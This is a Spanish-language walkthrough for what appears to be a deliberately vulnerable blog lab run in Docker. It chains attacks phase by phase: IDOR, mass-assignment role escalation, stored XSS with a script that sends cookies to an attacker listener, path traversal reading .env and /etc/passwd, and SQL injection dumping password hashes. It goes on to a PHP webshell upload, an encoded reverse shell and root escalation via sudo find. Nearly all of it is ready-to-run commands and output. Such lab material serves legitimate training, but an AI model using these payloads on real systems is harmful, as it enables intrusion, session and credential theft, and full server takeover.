# VBlog — Walkthrough

> Arquitectura: [arquitecture.md](arquitecture.md)

---

## Arranque

```bash
cd VBlog
sudo docker compose up --build -d
```

Abre `http://localhost` en el navegador.

---

## Fase 0 — Reconocimiento

Buscar rutas ocultas:
```bash
gobuster dir -u http://localhost \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50
```
> Encuentra `/backup`, `/debug`, `/old`, `/internal`, `/admin`

Leer las credenciales expuestas:
```bash
curl http://localhost/backup
```
> Devuelve usuario, contraseña de admin y credenciales de la BD en texto plano

Ver información de la aplicación:
```bash
curl http://localhost/debug
```
> Devuelve versión de PHP, driver de BD, número de usuarios

Enumerar usuarios sin autenticación (IDOR):
```bash
for i in $(seq 1 55); do
  echo -n "id=$i: "
  curl -s http://localhost/api/users/$i | grep -o '"role":"[^"]*"'
done
```
> Encuentra el admin en id 52: `"role":"admin"`

Buscar subdominios ocultos:
```bash
gobuster vhost -u http://localhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -t 30
```
> Encuentra `dev.vblog.local`

Añadir el subdominio y explorar el panel interno:
```bash
echo "127.0.0.1  dev.vblog.local" | sudo tee -a /etc/hosts
```
> Abre `http://dev.vblog.local/logs.html` en el navegador — cadena de conexión a PostgreSQL y trazas de peticiones API

---

## Fase 1 — Registro y login

Crear cuenta:
```bash
curl -s -X POST http://localhost/api/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker@test.com","passkey":"password123"}'
```
> `{"status":201,"message":"User created successfully"}`

Iniciar sesión y guardar la cookie:
```bash
curl -s -c /tmp/cookies.txt -X POST http://localhost/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@test.com","passkey":"password123"}'
```
> `{"status":200,"message":"Login correcto"}`

Ver tu usuario y rol actual:
```bash
curl -s -b /tmp/cookies.txt http://localhost/api/me
```
> `{"id":53,"name":"hacker","role":"user"}` — anota tu ID

---

## Fase 2 — Escalada a admin (Mass Assignment)

Cambiar tu rol a admin (sustituye `53` por tu ID):
```bash
curl -s -b /tmp/cookies.txt -X PUT http://localhost/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```
> `{"status":200,"user":{"role":"admin",...}}`

Verificar que eres admin:
```bash
curl -s -b /tmp/cookies.txt http://localhost/api/me
```
> `{"role":"admin"}` — escalada completada

Acceder al panel de administración:
> Abre `http://localhost/dashboard` en el navegador — acceso concedido sin verificación de rol

---

## Fase 3 — XSS + Panel interno

Inyectar XSS en un comentario (sustituye `1` por un ID de post válido):
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost/api/create/comment \
  -H "Content-Type: application/json" \
  -d '{"post_id":1,"content":"<script>alert(document.cookie)</script>"}'
```
> Abre el post en el navegador — aparece un `alert()` con la cookie de sesión

Robar la cookie de cualquier usuario que visite el post — abrir listener:
```bash
python3 -m http.server 8888
```

Inyectar el payload de robo (sustituye `TU_IP`):
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost/api/create/comment \
  -H "Content-Type: application/json" \
  -d '{"post_id":1,"content":"<script>fetch(\"http://TU_IP:8888/?c=\"+document.cookie)</script>"}'
```
> El listener recibe: `GET /?c=vblog-session=eyJ...`

Explorar el panel interno:
> Abre `http://dev.vblog.local/logs.html` — cadena de conexión completa a PostgreSQL

---

## Fase 4 — Path Traversal

Leer el `.env` de la aplicación:
```bash
curl -s -b /tmp/cookies.txt "http://localhost/api/admin/file?path=.env"
```
> Devuelve `APP_KEY`, `DB_PASSWORD` y toda la configuración

Leer archivos del sistema:
```bash
curl -s -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../../etc/passwd"
```
> Devuelve `/etc/passwd` del contenedor

---

## Fase 5 — SQL Injection

Confirmar la inyección:
```bash
curl -s -b /tmp/cookies.txt \
  "http://localhost/api/admin/stats?filter='" \
  -o /dev/null -w "HTTP %{http_code}\n"
```
> `HTTP 500` — error de PostgreSQL, inyección confirmada

Confirmar con inyección ciega basada en tiempo:
```bash
time curl -s -b /tmp/cookies.txt -G \
  --data-urlencode "filter=%' AND 1=(SELECT 1 FROM pg_sleep(3)) AND tags LIKE '%" \
  "http://localhost/api/admin/stats" -o /dev/null
```
> La respuesta tarda ~3 segundos

Volcar la tabla de usuarios:
```bash
sqlmap -u "http://localhost/api/admin/stats?filter=test" \
  --cookie="$(grep vblog-session /tmp/cookies.txt | awk '{print $6"="$7}')" \
  --dbms=postgresql --level=3 --risk=2 --batch --dump -T users
```
> Extrae todos los usuarios con sus hashes de contraseña

---

## Fase 6 — Subida de webshell (RCE)

Crear y subir el webshell:
```bash
echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php

curl -s -b /tmp/cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php;type=image/jpeg"
```
> `{"url":"http://localhost/avatars/shell.php"}`

Ejecutar comandos:
```bash
curl -s "http://localhost/avatars/shell.php?cmd=$(echo -n 'id' | base64 -w0)"
```
> `uid=33(www-data) gid=33(www-data)`

---

## Fase 7 — Reverse shell

Abrir el listener (Terminal 1):
```bash
nc -lvnp 4444
```

Enviar la reverse shell (Terminal 2):
```bash
curl "http://localhost/avatars/shell.php?cmd=cGhwIC1yICckcz1mc29ja29wZW4oIjE3Mi4xOC4wLjEiLDQ0NDQpOyRwPXByb2Nfb3BlbigiL2Jpbi9iYXNoIC1pIixhcnJheSgwPT4kcywxPT4kcywyPT4kcyksJHBpcGVzKTsn"
```
> La conexión llega al listener — shell muda sin prompt

Mejorar la shell (en Terminal 1):
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Pulsa `Ctrl+Z`, luego:
```bash
stty raw -echo; fg
```
Pulsa Enter dos veces.
> `www-data@contenedor:/var/www/html$` — shell interactiva completa

---

## Fase 8 — Escalada a root

Ver qué puede ejecutar www-data como root:
```bash
sudo -l
```
> `(root) NOPASSWD: /usr/bin/find`

Opción A — GTFOBins con sudo find:
```bash
sudo find . -exec /bin/bash \; -quit
```
```bash
whoami
```
> `root`

Opción B — SUID bash:
```bash
/tmp/rootbash -p
whoami
```
> `root`

Explorar como root:
```bash
id
cat /etc/shadow
ls -la /root
cat /root/.bash_history
```
> `uid=0(root) gid=0(root)` — control total del contenedor
